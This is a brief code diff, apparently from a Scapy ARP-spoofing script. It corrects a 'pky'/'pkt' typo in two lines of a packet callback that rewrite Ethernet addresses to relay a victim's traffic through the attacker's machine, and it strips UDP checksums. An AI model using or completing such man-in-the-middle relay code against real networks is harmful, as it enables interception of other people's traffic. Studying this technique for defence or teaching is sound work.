@@ -60,7 +60,7 @@ def arp_monitor_callback(pkt):
 		if pkt[IP].src == victim_IP:
 			# Set Ether property's options for MITM
 			pkt[Ether].src = attacker_MAC
-			pky[Ether].dst = router_MAC
+			pkt[Ether].dst = router_MAC
 			# To elimintate errors made by UDP, IP
 			if pkt.haslayer(UDP) == 1:
 				del pkt[UDP].chksum
@@ -75,7 +75,7 @@ def arp_monitor_callback(pkt):
 		if pkt[IP].dst == victim_IP:
 			# Set Ether property's options for MITM
 			pkt[Ether].src = attacker_MAC
-			pky[Ether].dst = victim_MAC
+			pkt[Ether].dst = victim_MAC
 			# To elimintate errors made by UDP, IP
 			if pkt.haslayer(UDP) == 1:
 				del pkt[UDP].chksum
